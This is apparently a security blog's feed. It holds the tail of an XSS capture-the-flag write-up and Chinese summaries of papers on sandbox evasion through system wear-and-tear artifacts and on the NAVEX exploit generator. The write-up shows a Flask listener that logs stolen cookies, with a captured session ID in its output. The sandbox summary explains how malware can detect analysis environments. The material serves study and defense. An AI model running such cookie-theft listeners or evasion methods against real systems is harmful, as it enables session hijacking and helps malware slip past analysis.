class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="comment"># blog : evilwing.me</span></span><br><span class="line"><span class="comment"># __Author__ : wing</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">xss = Flask(__name__)</span><br><span class="line"><span class="meta">@xss.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    flag = request.args</span><br><span class="line">    <span class="keyword">for</span> i,j <span class="keyword">in</span> flag.items():</span><br><span class="line">        print(<span class="string">'Flag is:'</span> + j)</span><br><span class="line">    <span class="keyword">return</span> str()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    xss.run(host=<span class="string">"0.0.0.0"</span>,port=<span class="number">51</span>)</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@zeros ~]# python xssflag.py</span><br><span class="line"> * Running on http://0.0.0.0:51/ (Press CTRL+C to quit)</span><br><span class="line">Flag is:b00t2root&#123;why_y0u_st34l_my_c00ki3s?&#125;; PHPSESSID=up8133i9r901kr52r93v5um0vf</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;比赛地址: &lt;a href=&quot;http://3.17.26.191/&quot; target=&quot;_blank
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Spotless Sandboxes-&gt;Evading Malware Analysis Systems using Wear-and-Tear Artifacts</title>
    <link href="http://zer0yu.github.io/2019/03/20/Spotless-Sandboxes/"/>
    <id>http://zer0yu.github.io/2019/03/20/Spotless-Sandboxes/</id>
    <published>2019-03-20T07:38:10.000Z</published>
    <updated>2019-03-20T07:40:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>出处：2017 IEEE Symposium on Security and Privacy (SP)<br>作者：Najmeh Miramirkhani, Mahathi Priya Appini, Nick Nikiforakis, Michalis Polychronakis<br>单位：Stony Brook University<br>资料：<a href="https://ieeexplore.ieee.org/abstract/document/7958622" target="_blank" rel="noopener">Paper</a> </p><h2 id="1-Abstract-amp-INTRODUCTION"><a href="#1-Abstract-amp-INTRODUCTION" class="headerlink" title="1.Abstract &amp; INTRODUCTION"></a>1.Abstract &amp; INTRODUCTION</h2><p>动态恶意代码分析系统通过将每个样本加载到称为沙箱的大量仪器环境中来操作，并以不同的粒度级别（例如，I/O活动，系统调用，机器指令）监视其操作。 恶意软件沙箱通常使用API hooking机制、CPU仿真器、虚拟机、甚至是专用的裸机主机来构建。</p><p>攻击者角度:</p><ol><li>使用打包、多态以及其他代码混淆技术规避基于静态代码分析的恶意软件扫描技术；</li><li>在恶意软件中加入一定的“环境感知能力”来规避恶意软件沙箱环境的分析(在发现身处沙箱环境后采用直接崩溃或者展示“良性”行为)。</li></ol><p>防御者角度:</p><ol><li>一般而言用实际值替换分析环境的特有属性并隐藏检测工具，来尝试避免被恶意软件感知；</li><li>针对使用仿真或者虚拟技术的产品而言，使用清除特定的驱动程序、进程以及其它虚拟技术指示器来实现防规避；</li><li>使用裸机(在进行一定的隔离后，直接使用物理计算机)。</li></ol><p>防御者角度的问题缺陷:</p><ol><li>用于分析的操作系统几乎是原始状态的；</li><li>每次进行过二进制分析之后就会将系统回滚至最初状态(浏览器记录、系统日志等信息均被回滚)。</li></ol><p>PS:以上内容之所以说是缺陷，是因为真实环境中用户不可能主动去将”缓存”(广义缓存，泛指日志、注册表等)的记录进行回滚或者初始化。</p><p>因此在本文中作者提出了一种利用操作系统“wear and tear”(使用痕迹的含义，后文简称为磨损)和“aging”(使用年份的含义，后文简称为老化)的特征来规避sandbox(恶意软件沙箱环境)的方法。</p><p>本文的两项研究成果:</p><ol><li>构建决策树模型，使恶意软件稳定地避免所有经过测试的沙箱的准确率提升至92.86％；</li><li>构建的统计模型可以根据系统使用指标预测系统的年龄，并可用于将现有的人造沙箱“老化”到所需的年限范围。</li></ol><h2 id="BACKGROUND-AND-RELATED-WORK"><a href="#BACKGROUND-AND-RELATED-WORK" class="headerlink" title="BACKGROUND AND RELATED WORK"></a>BACKGROUND AND RELATED WORK</h2><h3 id="A-Virtualization-and-Instrumentation-Artifacts"><a href="#A-Virtualization-and-Instrumentation-Artifacts" class="headerlink" title="A. Virtualization and Instrumentation Artifacts"></a>A. Virtualization and Instrumentation Artifacts</h3><ol><li>防御者D: 使用系统仿真器和虚拟机构建恶意软件沙箱十分方便</li><li>攻击者A: 使用静态启发式检查某些系统属性，例如特定于VM的设备驱动程序和硬件配置，固定标识符（包括MAC地址），IMEI（用于移动恶意软件分析系统），用户/主机名，VM特定加载的模块和流程（例如VMware的VMware Tools）和注册表项等</li><li>防御者D: 配置动态分析系统时以避免出现期望值和配置</li><li>攻击者A: 这对虚拟化指令的时序属性、运行时使用小代码片段等底层属性作用不大</li></ol><h3 id="B-Environmental-and-User-Interaction-Artifacts"><a href="#B-Environmental-and-User-Interaction-Artifacts" class="headerlink" title="B. Environmental and User Interaction Artifacts"></a>B. Environmental and User Interaction Artifacts</h3><p>防御者D: 我的两种方案:</p><ol><li>在多个不同的分析系统上运行每个样本来检测恶意软件的“分裂个性”；</li><li>避免完全使用仿真或虚拟化，并选择“裸机”系统来保持分析环境的真实性。</li></ol><p>攻击者A: 目前虚拟化技术的广泛使用，应当认为VM和非VM是具有同样的感染价值的，从而减少对VM检测技巧的使用，转而采取如下几种启发式方法:</p><ol><li>检查鼠标光标是否在屏幕中央保持静止；</li><li>是否存在“最近打开文件”；</li><li>异常低数量的进程；</li><li>不受限制的互联网连接，并尝试解析已知的不存在的域名(比如WannaCry)。</li></ol><p>防御者D: 我的两种对策:</p><ol><li>模拟用户行为；</li><li>暴露更真实的网络环境</li></ol><p>防御者D对策的缺陷: 系统正常使用而预计会发生磨损和老化特征未被考虑。</p><h3 id="C-Sandbox-Fingerprinting"><a href="#C-Sandbox-Fingerprinting" class="headerlink" title="C. Sandbox Fingerprinting"></a>C. Sandbox Fingerprinting</h3><p>SandFinger: 使用移动设备属性来作为沙箱指纹来规避Google的Bouncer沙箱。</p><p>AVLeak: 使用侧信道的方式捕获AV引擎中的指纹。</p><p>SandPrint: 提取Windows沙箱中的硬件配置参数，恶意软件样本调用机制的特征，可执行文件的文件名等特征进行聚类分析，进而识别沙箱。</p><p>如果沙箱操作员将沙箱的特征值进行多样化处理，致使是指纹失效。那么攻击者下一步会考虑怎么方法进行规避? 这种方式就是本文中所提到的真实系统才具有的“磨损”和“老化”特征。</p><h2 id="III-WEAR-AND-TEAR-ARTIFACTS"><a href="#III-WEAR-AND-TEAR-ARTIFACTS" class="headerlink" title="III. WEAR AND TEAR ARTIFACTS"></a>III. WEAR AND TEAR ARTIFACTS</h2><p>文中选用的artifact的特点: 恶意软件可以轻松探测</p><p>artifact的选择策略: 哪些在系统的正常使用中会被影响</p><h3 id="A-Probing-for-Artifacts-while-Preserving-User-Privacy"><a href="#A-Probing-for-Artifacts-while-Preserving-User-Privacy" class="headerlink" title="A. Probing for Artifacts while Preserving User Privacy"></a>A. Probing for Artifacts while Preserving User Privacy</h3><p>从artifact地选择上来看可以分为两种:一种是直接源于用户活动；另一种是来自系统活动(用户活动的间接表现)。</p><p>直接来源是针对用户行为的定性指标：</p><ol><li>文档文件夹是否包含具有预期文件扩展名的合理数量的文件；</li><li>检查流行文档查看应用程序中最近打开的文档；</li><li>最近键入的在线搜索引擎查询；</li><li>系统范围的搜索查询</li><li>即时消息；</li><li>电子邮件消息内容<br>但是这些将会对用户的隐私造成侵犯，所以本文的方案将使用间接来源(比如:统计cookie、访问的URL数量等方式)</li></ol><h3 id="B-Artifact-Categories"><a href="#B-Artifact-Categories" class="headerlink" title="B. Artifact Categories"></a>B. Artifact Categories</h3><p>本文主要针对Windows操作系统进行研究，所以采用的artifact类别集合如下表所示:</p><p><img src="https://i.loli.net/2019/03/20/5c91ebb3a0f41.png" alt="C8483676-8960-47A8-86DB-0BA4C555E98B.png"></p><h2 id="IV-DATA-COLLECTION"><a href="#IV-DATA-COLLECTION" class="headerlink" title="IV. DATA COLLECTION"></a>IV. DATA COLLECTION</h2><h3 id="A-Probe-Tool-Implementation"><a href="#A-Probe-Tool-Implementation" class="headerlink" title="A. Probe Tool Implementation"></a>A. Probe Tool Implementation</h3><p>为了从真实用户系统和恶意软件沙箱中收集以上类别的artifact数据集，作者实现了一个只使用系统API、不需要安装并且兼容Windows XP到Windows 10的探针程序。这个程序主要有以下几个特点:</p><ol><li>使用HTTPS信道传输收集到的artifact数据防止沙箱拦截请求；</li><li>收集一些BIOS供应商等其他信息用于VM启发式检测，来去除用户集中可能存在的VM结果集；</li><li>唯一的嵌入式ID来识别同一供应商的多次提交(一些砂箱会将程序放在多个不同的环境中进行动态分析，进而检测其行为)；</li><li>基于操作系统安装日期，Windows版本，BIOS供应商等信息的组合来区分不同的操作系统。</li></ol><h3 id="B-IRB-Approval-and-User-Involvement"><a href="#B-IRB-Approval-and-User-Involvement" class="headerlink" title="B. IRB Approval and User Involvement"></a>B. IRB Approval and User Involvement</h3><p>这部分主要讲述作者在申请IRB批准，从而让真实用户参与进这个项目中。</p><h3 id="C-Data-Collection"><a href="#C-Data-Collection" class="headerlink" title="C. Data Collection"></a>C. Data Collection</h3><p><strong>第一个数据集（Dreal）-&gt;</strong> 270个真实用户机器，其中有89.4％是Amazon Mechanical Turk workers。国家分布为美国（44％），印度（18％），GB（10％），CA（8％），NL（1％），PK （1％），RU（1％）和其他28个频率低于1％的国家/地区(这种国家分析代表了从发达国家到发展中国家的计算机使用磨损特性)。表II中显示了用户系统的BIOS供应商分布。</p><p><img src="https://i.loli.net/2019/03/20/5c91ebd9f2459.png" alt="C78622AB-6BEF-4026-BD60-443C678D64C4.png"></p><p>PS:后面作者发现Amazon Mechanical Turk workers是一种跟搜索引擎相结合的沙箱，因此将这一部分的数据标记为“crawlers”并合并到后面的沙箱数据集中。</p><p><strong>第二个数据集（Dsand）-&gt;</strong> 来自15个可以收集到信息的恶意软件沙箱，表III是沙箱与对应探针回收的信息。</p><p><img src="https://i.loli.net/2019/03/20/5c91ebf611d6b.png" alt="F93245B2-9D5E-4021-8193-C786CCB797B6.png"></p><p>PS:有的沙箱环境会在底层使用不同版本的操作系统来分别进行分析。</p><p><strong>第三个数据集（Dbase）-&gt;</strong> 基准数据集，数据来自多个全新安装的Microsoft Windows版本(包括Azure和AWS提供的云Windows服务器)。</p><h3 id="D-Dataset-Statistics"><a href="#D-Dataset-Statistics" class="headerlink" title="D. Dataset Statistics"></a>D. Dataset Statistics</h3><p>表IV显示了我们三个收集的数据集中不同Microsoft Windows版本的数量。(可以看出沙箱的系统分布与真实用户的是不相同的)。</p><p><img src="https://i.loli.net/2019/03/20/5c91ec1191b91.png" alt="245E7896-EF5A-4113-9D57-9B52A7CBAF1C.png"></p><p>图1显示了三个数据集（Dreal，Dsand和Dbase）中每个磨损artifact值的分布。从中可以看到:1.大多数artifact在真实用户系统中的值大于沙箱和基线中的值，因此可以用来区分真实用户和沙箱；2.真实用户的artifact值分布更宽，因此可以用来预测系统年龄。</p><p>PS: 可以看到沙箱的appdiffdays和sysdiffdays值比真实用户高很多，因此沙箱系统一般比真实用户系统“老化”程度更高。</p><p><img src="https://i.loli.net/2019/03/20/5c91ec2ee2d88.png" alt="14E8B219-A888-4C3C-B543-F662C51B6938.png"></p><p>图2显示了Mann-Whitney U检验显示的Dreal和Dsand分布之间差异的影响大小。0.3和0.5之间的效果被认为是“中等”效应的特征，而高于0.5的效应被认为是“强”效应。 </p><p><img src="https://i.loli.net/2019/03/20/5c91ec4613e0d.png" alt="35DDDF7E-590D-43D1-908D-68EE9F072667.png"></p><h2 id="V-EVADING-MALWARE-SANDBOXES"><a href="#V-EVADING-MALWARE-SANDBOXES" class="headerlink" title="V. EVADING MALWARE SANDBOXES"></a>V. EVADING MALWARE SANDBOXES</h2><p>以上的统计信息说明了作者所选用的artifact是可以作为特征来分辨沙箱的，因此接下来将使用有监督机器学习方式，训练决策树模型来进一步完成对沙箱的规避工作。</p><h3 id="A-Setup-and-Classifier"><a href="#A-Setup-and-Classifier" class="headerlink" title="A. Setup and Classifier"></a>A. Setup and Classifier</h3><ol><li>使用决策树模型。因为决策树模型可以表现为一系列的if-else语句，从而将恶意软件的整体足迹保持在最小。</li><li>计算皮尔森相关系数（r）来检查特征对的相关性。虽然有4对特征具有很强的相关性（r&gt; 0.7），但是为了尽可能的规避所有沙箱，作者还是采用了所有的特征。</li><li>训练集：49个沙箱环境实例，22个新安装操作系统的实例，71个真实用户实例；测试集：剩余的49个沙箱环境实例，49个真实用户随机样本。</li><li>使用10-trial adaptive boosting算法(创建多个树，每个树专注改进前一棵树的结果)和adaptive boosting决策树算法(覆盖单棵树不能到达的边界)来提升分类器准确性。</li><li>指定成本矩阵减少漏报的出现(原则是宁可不感染到某些真实用户，也尽量不能被沙箱捕获)。</li></ol><p>PS: FP 误报-&gt;没有感染真实用户主机；FN 漏报-&gt;尝试感染沙箱</p><h3 id="B-Evaluation"><a href="#B-Evaluation" class="headerlink" title="B. Evaluation"></a>B. Evaluation</h3><p>模型在测试集上达到了92.86％的准确率，假阴性率（FNR）为4.08％，假阳性率（FPR）为10.20％。 十个构建的树的平均树大小为4.6分裂，最短的树具有3个分裂，最长的树分裂为5个。 表V显示了对算法最有用的功能，以及使用任何给定功能的树的百分比。</p><p><img src="https://i.loli.net/2019/03/20/5c91ec5d88eee.png" alt="A9DDAD20-0A49-4538-A0F3-82D1761AAD55.png"></p><p>之后作者从两个思路出发:<br>一、评估我们的算法对沙盒环境中增量变化的稳健性<br>方法: 每次只删除一个特征，将以上分类器训练过程重复30次。<br>目的: 对于攻击者而言量化恶意软件区分沙箱和真实用户的能力；对于防御者而言可以使用在此处识别的最有价值的artifact磨损程度来模仿真实的用户系统。<br>效果: 图4显示了准确性，误报率和漏报率如何变化。可以看到即使删除多达20个特征，分类器的整体准确性仍高于90%。</p><p><img src="https://i.loli.net/2019/03/20/5c91ec794e2f8.png" alt="5449284B-9778-47B5-AD73-8A4192F83FEF.png"></p><p>二、每种类型的工件如何影响分类器的准确性<br>方法: 一次仅使用<strong>一种</strong>类型的工件重新训练我们的模型。<br>目的: 让恶意软件作者可以选择他们想要关注的artifact类别，但这种选择不会影响恶意软件的规避能力。<br>效果: 表VI显示了每个类别的artifact数量以及每个分类器在测试数据集上的性能。</p><p><img src="https://i.loli.net/2019/03/20/5c91ec96391e3.png" alt="7045C7A1-D656-47AB-9A00-EF01DD79BE20.png"></p><h2 id="VI-ESTIMATING-ACTUAL-SYSTEM-AGE"><a href="#VI-ESTIMATING-ACTUAL-SYSTEM-AGE" class="headerlink" title="VI. ESTIMATING ACTUAL SYSTEM AGE"></a>VI. ESTIMATING ACTUAL SYSTEM AGE</h2><p>在之前的数据分析中，可以发现沙箱环境的“老化”程度与用户的真实环境是截然不同的。而且理论上“磨损”程度和“老化”程度应该是相匹配的，如果不匹配那么是沙箱的概率则很大。对于攻击者可以使用者一特点进行沙箱规避；对于防御者则可以对沙箱做更好的调整。</p><h3 id="A-Correlation-Between-Age-and-Artifacts"><a href="#A-Correlation-Between-Age-and-Artifacts" class="headerlink" title="A. Correlation Between Age and Artifacts"></a>A. Correlation Between Age and Artifacts</h3><p>目的: 得出artifact的磨损与系统年龄之间的关系</p><p>图5显示了用户系统和恶意软件沙箱“年龄”的累积分布函数。可以看到平均而言用户系统比沙箱更“新”。</p><p><img src="https://i.loli.net/2019/03/20/5c91ecb059a15.png" alt="955EEF8C-F9A3-484B-BED1-E9639103F436.png"></p><p>图6显示了报告的年龄与真实用户系统的每个artifact磨损程度之间的皮尔森相关系数。此处假设从真实用户系统收集的报告年龄是准确的。</p><p><img src="https://i.loli.net/2019/03/20/5c91ecc913f22.png" alt="BB57F337-F65C-4E51-97DA-6D705ADBD54E.png"></p><p>观测结果分析:</p><ol><li>许多非常成功地区分真实机器和沙箱的工件实际上与机器的年龄无关；</li><li>一些与用户活动直接相关的artifact不能很好的反映系统的年龄，比如cookie的数量(用户可以主动清除)；</li><li>一些不太容易被用户修改的artifact将跟系统年龄成正相关，比如连接过的USB数量。</li></ol><h3 id="B-Regression"><a href="#B-Regression" class="headerlink" title="B. Regression"></a>B. Regression</h3><p>目的: 确定组合它们的原始值来估计系统的实际年龄的合适方法。<br>数据集处理: </p><ol><li>删除具有缺失值的artifact；</li><li>删除丢失率超过80％的artifact。</li></ol><p>(1) Linear Regression:</p><ul><li>公式: Y =β0+β1X1+β2X2+ … +ε (Xi是给定的artifact值，βi是对应的权重，Y是预测的年龄)</li><li>数据集: 训练（60％），测试（40％）</li><li>评估: 十折交叉验证</li><li>结果: 真实系统的预测年龄的最终均方误差（MSE）是1.88，而沙箱的MSE非常高，为6.25。</li><li>结论: 使用artifact的磨损程度来预测系统年龄是可行的，也就是说使用预测年龄和系统的生成年龄的对比来识别沙箱是可行的。</li></ul><p>PS: 十折交叉验证，英文名叫做10-fold cross-validation，用来测试算法准确性。是常用的测试方法。将数据集分成十份，轮流将其中9份作为训练数据，1份作为测试数据，进行试验。</p><p>表VII中报告了模型的系数及其p值。 我们看到13种artifact磨损程度与机器的年龄相关，具有统计学意义。</p><p><img src="https://i.loli.net/2019/03/20/5c91ecdfea41f.png" alt="979FD293-1188-4E1A-9CBD-B71774AE2479.png"></p><p>图7显示了在Dreal和Dsand系统上应用线性回归模型时残差值的累积分布函数(CDF)。可以看到在尝试预测沙箱年龄时的残差值是非常高的。</p><p><img src="https://i.loli.net/2019/03/20/5c91ecf70f6f7.png" alt="78E7479C-A68A-4E2E-A22A-30EEB34D017A.png"></p><p>(2) Lasso Regression</p><ul><li>目的: 验证复杂的回归模型是否会带来更好的预测准确性</li><li>套索回归的优点: 比线性回归使用更少的预测变量，这降低了整体模型的复杂性。 对于恶意软件，较小的功能集意味着对底层操作系统的API调用较少，从而减少了触发可疑活动监视器的机会。</li><li>数据集: 训练集，评估集和测试集</li><li>方法: 交叉验证来找到最佳的λ值</li><li>结果: Dreal集的MSE为0.749，Dsand集上的MSE为4.45，优于线性回归</li><li>结论: Lasso模型可以更好地辨别沙箱。</li></ul><p>表VIII显示了Lasso模型选择的八个特征，它们是系统年龄及其相应系数的良好预测因子。</p><p><img src="https://i.loli.net/2019/03/20/5c91ed105f20b.png" alt="D81E841A-08BA-45BF-8A4E-B01D07FEE934.png"></p><p>小结: 使用artifact磨损程度来预测系统年龄是可行的，这一方面可以用于辨识沙箱；另一方面是可以帮助sandbox开发人员创建系统年龄相符的沙箱环境</p><h2 id="VII-DISCUSSION"><a href="#VII-DISCUSSION" class="headerlink" title="VII. DISCUSSION"></a>VII. DISCUSSION</h2><h3 id="A-Ethical-Considerations-and-Coordinated-Disclosure"><a href="#A-Ethical-Considerations-and-Coordinated-Disclosure" class="headerlink" title="A. Ethical Considerations and Coordinated Disclosure"></a>A. Ethical Considerations and Coordinated Disclosure</h3><p>本文主要讲述了这种新的规避技术的有效性，并且目前已经出现了此类相关工作的恶意软件。但是本文主要是为了帮助创建更强大的恶意软件分析系统。</p><h3 id="B-Probing-Stealthiness"><a href="#B-Probing-Stealthiness" class="headerlink" title="B. Probing Stealthiness"></a>B. Probing Stealthiness</h3><p>1.总是存在不受监控的artifact集；<br>2.虽然最小特权原则造成的系统API调用限制，可访问的环境限制，但是依旧可以从其他不受限制的artifact集获取大量信息；</p><h3 id="C-OS-Dependability"><a href="#C-OS-Dependability" class="headerlink" title="C. OS Dependability"></a>C. OS Dependability</h3><p>文章虽然是基于Windows平台在进行artifact的分析，但其中的一些artifact并不是其特有的，在其它系统例如Linux，Mac，Android等也同样适用。如果想适用Java等编写跨平台的恶意软件，就可以去关注那些不依赖于特定系统而存在的artifact。</p><h3 id="D-Defenses"><a href="#D-Defenses" class="headerlink" title="D. Defenses"></a>D. Defenses</h3><ol><li>克隆真实用户系统并将其用作恶意软件沙箱的基础。<br>缺点:<br>i) 隐私问题（如何在克隆之前或之后擦除所有私人信息，但保留磨损工件完整？）；<br>ii) artifact的老化问题(攻击者可以使用我们提出的统计模型来检测声称的年龄与磨损程度不匹配的情况)。</li><li>从新安装的操作系统映像开始，通过自动模拟用户操作人为地使其老化。<br>缺点:尚不清楚这种人工老化在多大程度上会产生与真实系统相似的artifact情况。</li></ol><h2 id="VIII-CONCLUSION-AND-FUTURE-WORK"><a href="#VIII-CONCLUSION-AND-FUTURE-WORK" class="headerlink" title="VIII. CONCLUSION AND FUTURE WORK"></a>VIII. CONCLUSION AND FUTURE WORK</h2><p>本文主要做了两个方面工作:</p><ol><li>攻击者角度:将Windows系统的一些不涉及用户隐私的artifact作为特征，使用决策树分类器进行训练，最终可以在92.86％的准确度上来识别沙箱环境。</li><li>防御者角度:将系统的artifact特征与系统的年龄进行联系并提出统计模型，从而帮助沙箱操作人员对系统进行微调，使其具有更逼真的磨损特性。</li></ol><p>未来工作:</p><ol><li>克隆真实用户系统并将其用作恶意软件沙箱的基础。</li><li>自动模拟用户操作人为地使系统其老化到所需程度。</li><li>不同的桌面操作系统以及移动设备中评估基于artifact磨损特性的沙盒规避的有效性。</li></ol><p>PS: 本文技术仅供研究参考，请勿利用本文技术施行攻击行为。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;出处：2017 IEEE Symposium on Security and Privacy (SP)&lt;br&gt;作者：Najmeh Miramirkhani, Mahathi Priya Appini, Nick Nikiforakis, Michalis Polychron
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>NAVEX-&gt;Precise and Scalable Exploit Generation for Dynamic Web Applications</title>
    <link href="http://zer0yu.github.io/2019/03/11/NAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications/"/>
    <id>http://zer0yu.github.io/2019/03/11/NAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications/</id>
    <published>2019-03-11T12:01:16.000Z</published>
    <updated>2019-03-11T12:20:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>出处：27th USENIX Security Symposium<br>作者：Abeer Alhuzali, Rigel Gjomemo, Birhanu Eshete, and V.N.<br>单位：Venkatakrishnan University of Illinois at Chicago<br>资料：<a href="https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-alhuzali.pdf" target="_blank" rel="noopener">Paper</a> | <a href="https://github.com/aalhuz/navex" target="_blank" rel="noopener">Github</a></p><h2 id="1-Abstract-amp-Introduction"><a href="#1-Abstract-amp-Introduction" class="headerlink" title="1. Abstract &amp; Introduction"></a>1. Abstract &amp; Introduction</h2><p>作者在本文中提出了一种以静态分析作为指导，结合动态分析自动验证漏洞并构造可用exploit的工具NAVEX。</p><p>研究问题：</p><ol><li>解决以往自动化审计的误报以及必须结合人工参与构造Exp的问题；</li><li>静态分析虽然覆盖率高，但是对于具有动态特性的语言其建模困难。</li></ol><p>解决方案：</p><ol><li>静态分析阶段：使用符号执行创建Web应用程序的各个模块的行为模型。标记出包含潜在漏洞点的模块；</li><li>动态分析阶段：使用Web爬虫和concolic执行器去发现可能导致攻击者进入易受攻击模块的可能的HTTP导航路径，之后使用约束求解器生成一组对漏洞进行利用的HTTP输入序列。</li></ol><p>方案优点：</p><ol><li>动态分析与静态分析相结合提升了性能，可以应用于大型应用程序；</li><li>是一种多类型漏洞的Exp生成框架。</li></ol><p>NAVEX分析了320万行PHP代码，自动构建并利用204个漏洞，其中有195个与SQLI和XSS相关，而9个与逻辑漏洞相关。此外NAVEX是第一个可以自动发现并利用EAR漏洞的方案。</p><h2 id="2-Challenges-and-Approach-Overview"><a href="#2-Challenges-and-Approach-Overview" class="headerlink" title="2 Challenges and Approach Overview"></a>2 Challenges and Approach Overview</h2><h3 id="2-1-Running-Example"><a href="#2-1-Running-Example" class="headerlink" title="2.1 Running Example"></a>2.1 Running Example</h3><p>下面是一个包含漏洞的小型Web程序。selectBooks.php模块在第23-38行使用了Web表单来实现选择数据，其中在23行调用了JavaScript来验证数输入，相关定义在第31-36行。第4-12行实现用户输入由服务器端代码进一步验证和过滤。之后第17行通过MySQL查询来验证书籍的可用性。最后根据查询结果，初始化<code>$_SESSION[&#39;ISBN&#39;]</code>并在浏览器上打印到hold.php的HTTP链接。</p><p><img src="https://i.loli.net/2019/03/11/5c864e9947f8c.png" alt="8E259CF4-FEA9-4D4E-8E07-C08A15BA1EB6.png"></p><p>之后跳转到hold.php执行附加检查，如果满足，则HTTP链接引导用户进入下一步（第7行）。 单击链接时，将设置超全局<code>$_GET [&#39;step&#39;]</code>，从而让hold.php包含模块checkout.php并执行。 </p><p><img src="https://i.loli.net/2019/03/11/5c864ec6577c1.png" alt="5A1EE632-5A0E-491B-8195-C1B06838143C.png"></p><p>checkout.php通过向用户提供链接（第19行）进行确认来完成借用过程。 该链接设置两个超全局变量（<code>$_GET[&#39;step&#39;]</code>和<code>$_GET[&#39;msg&#39;]</code>），将在第6行进行检验。最后，调用确认功能（第13行）以通知用户该书已成功保留。</p><p><img src="https://i.loli.net/2019/03/11/5c864f01361f7.png" alt="E9459D5E-66EE-4A62-97DA-943E13DF4E35.png"></p><p>该程序存在以下几点缺陷：</p><ol><li>selectBooks.php:17中$publisher经过简单校验就传入SQL语句进行拼接，可造成SQLi漏洞(str_place函数进行了无效过滤)；</li><li>checkout.php:15行使用了echo，可能会造成XSS；</li><li>selectBooks.php:3行调用header但是没有使用exit()，造成EAR漏洞进而可以在不进行登录的情况下触发下面的SQLi漏洞。</li></ol><h3 id="2-2-Challenges"><a href="#2-2-Challenges" class="headerlink" title="2.2 Challenges"></a>2.2 Challenges</h3><p>面临的挑战主要是以下三点：</p><ol><li><strong>污点可达性</strong>：对于WebApp而言，完成一个功能往往是各模块相关联的。此外，模块中往往还使用内置函数过滤(比如htmlspecialchars)、隐式过滤(比如类型转换)、自定义过滤和数据库约束条件带来的过滤来消除风险。所以攻击路径的寻找是具有一定难度的。</li><li><strong>动态特征</strong>：静态分析对于动态程序的分析具有局限性，比如无法推断动态将会生成怎样的表单或者链接(比如使用JavaScript来生成的内容)。</li><li><strong>扩展性</strong>：对大型程序的分析会覆盖客户端，服务器端和数据库后端，因而会产生很多路径，必须使用一些方法来减少一些无用的路径。<u>(之所以叫扩展性应该是跟后面的COG图的扩展有关)</u></li></ol><h3 id="2-3-Approach-Overview"><a href="#2-3-Approach-Overview" class="headerlink" title="2.3 Approach Overview"></a>2.3 Approach Overview</h3><p>方法主要分为两个步骤：</p><ol><li>可能的漏洞点识别。首先，定位程序中可能的漏洞点以及对应的模块(这样减少后面的搜索空间)；其次，对各种过滤方案进行了精确表示；最后，对自定义的过滤先使用符号约束构建模型之后使用约束求解器来判断过滤的稳健性。</li><li>具体的漏洞利用生成。首先，动态执行得到Web应用程序的导航结构；其次，结合静态分析得到的漏洞点和对应的模块寻找可行的攻击路径；最后，多次重复动态执行，使用约束求解最大化路径覆盖。</li></ol><p><img src="https://i.loli.net/2019/03/11/5c864f4b35dce.png" alt="D2FB48D5-F690-4DAA-BC89-AB374F6E5E7D.png"></p><h2 id="3-Architecture-and-Algorithms"><a href="#3-Architecture-and-Algorithms" class="headerlink" title="3 Architecture and Algorithms"></a>3 Architecture and Algorithms</h2><h3 id="3-1-Vulnerable-Sink-Identification"><a href="#3-1-Vulnerable-Sink-Identification" class="headerlink" title="3.1 Vulnerable Sink Identification"></a>3.1 Vulnerable Sink Identification</h3><p>目的：排除那些不包含漏洞点的模块<br>方法：如下图，首先，构建每个模块代码的图模型；然后，发现包含源和目标(漏洞点)之间数据流的路径；最后，使用符号执行生成公式后利用约束求解以确定哪些路径可能被利用。</p><p><img src="https://i.loli.net/2019/03/11/5c864f6bcf338.png" alt="B064337B-B161-45E6-9D27-DAFF8483B062.png"></p><h4 id="3-1-1-Attack-Dictionary"><a href="#3-1-1-Attack-Dictionary" class="headerlink" title="3.1.1 Attack Dictionary"></a>3.1.1 Attack Dictionary</h4><p>多种漏洞被触发的过程是相似的–均是攻击载荷到达敏感接收器进而触发漏洞，所以NAVEX使用这种相似性构建了一个包含Sinks(敏感接收器)、Sanitizations(过滤函数)、遍历类型(前向遍历还是反向遍历)和攻击字符串(其实就是收集的WebFuzz字典)的攻击字典来实例化针对每类漏洞的分析。<br>字典包含：SQLI，XSS，文件包含，命令注入，代码执行和EAR漏洞。</p><h4 id="3-1-2-Graph-Construction"><a href="#3-1-2-Graph-Construction" class="headerlink" title="3.1.2 Graph Construction"></a>3.1.2 Graph Construction</h4><p>代码属性图（CPG）是一种结合了抽象语法树（AST），控制流图（CFG），调用图和数据依赖图（DDG）的表示。此处，将过滤标签和数据库约束标记作为属性添加到CPG，从而对其进行扩展。最终将漏洞发现问题转变为对CPG图的遍历问题。</p><h4 id="3-1-3-Graph-Traversal"><a href="#3-1-3-Graph-Traversal" class="headerlink" title="3.1.3 Graph Traversal"></a>3.1.3 Graph Traversal</h4><p>此步骤的目的是通过对扩展后CPG来寻找攻击路径，主要分为向后遍历和向前遍历。向后遍历的算法如下图所示。正向遍历则主要是从源到可能漏洞点的路径搜索，这种搜索方式也是对EAR漏洞的重要检测方法。(文中提到了良性EAR–header之后不含可利用点和恶性EAR–header之后包含可利用点)。图遍历最终将会返回一组可能容易受到攻击的路径供下一步使用。</p><p><img src="https://i.loli.net/2019/03/11/5c864fb562365.png" 